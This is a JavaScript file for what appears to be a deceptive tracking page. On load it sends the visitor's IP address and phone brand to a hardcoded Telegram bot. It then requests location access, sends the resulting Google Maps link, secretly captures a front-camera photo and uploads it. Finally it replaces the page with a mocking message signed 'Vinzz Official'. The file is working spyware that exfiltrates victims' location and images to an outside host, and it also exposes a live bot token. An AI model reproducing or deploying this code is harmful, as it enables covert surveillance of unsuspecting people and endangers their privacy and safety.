const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
const chat_id = '7777604508';

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "❌ Tidak diketahui";
  }
}

function getMerekHP() {
  const ua = navigator.userAgent;

  if (/CPH/i.test(ua)) return "OPPO";
  if (/RMX/i.test(ua)) return "Realme";
  if (/M210|Mi|Redmi/i.test(ua)) return "Xiaomi";
  if (/SM-/i.test(ua)) return "Samsung";
  if (/V\d{4}/i.test(ua)) return "Vivo";
  if (/Infinix/i.test(ua)) return "Infinix";
  if (/TECNO/i.test(ua)) return "Tecno";
  if (/iPhone/i.test(ua)) return "iPhone";
  if (/ASUS|ZB\d+/i.test(ua)) return "Asus";
  if (/Huawei|HONOR|DUA-|LYA-/i.test(ua)) return "Huawei";
  if (/Pixel/i.test(ua)) return "Google Pixel";
  if (/Nokia|TA-\d+/i.test(ua)) return "Nokia";
  if (/Lenovo/i.test(ua)) return "Lenovo";
  if (/LG-/i.test(ua)) return "LG";

  return "Tidak diketahui";
}

async function kirimFoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    video.srcObject = stream;
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    await new Promise(resolve => setTimeout(resolve, 2000));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    return new Promise(resolve => {
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("photo", blob, "kamera.png");
        formData.append("caption", "📸 ini fotonya tuan vinzz");

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(resolve);
      }, 'image/png');
    });

  } catch (err) {
    console.warn("Akses kamera ditolak atau gagal.");
    await kirimPesanTelegram("⚠️ Gagal ambil foto, kamera tidak diizinkan.");
  }
}

async function kirimPesanTelegram(pesan) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chat_id,
      text: pesan
    })
  });
}

(async () => {
  const ip = await getIP();
  const merek = getMerekHP();
  const pesanAwal = `📡 *Tracking dimulai!*\n\n🌐 IP: ${ip}\n📱 Merek HP: ${merek}\n📍 Lokasi: ⏳ Menunggu izin lokasi...`;
  await kirimPesanTelegram(pesanAwal);
})();

navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `📍 *Lokasi ditemukan!*\n\n🌐 IP: ${ip}\n📱 Merek HP: ${merek}\n📌 Maps: [Lihat Lokasi](${gmaps})\n\n📸 Sedang mengambil foto...`;
    await kirimPesanTelegram(pesan);
    kirimFoto();

    document.body.innerHTML = '<h2>Yahh kurang hoki bro<br><small>by Vinzz Official</small></h2>';
  },
  async () => {
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `📛 Lokasi ditolak!\nFoto tidak diambil otomatis.`;
    await kirimPesanTelegram(pesan);

    document.body.innerHTML = '<h2>Yahh kurang hoki bro<br><small>by Vinzz Official</small></h2>';
  }
);
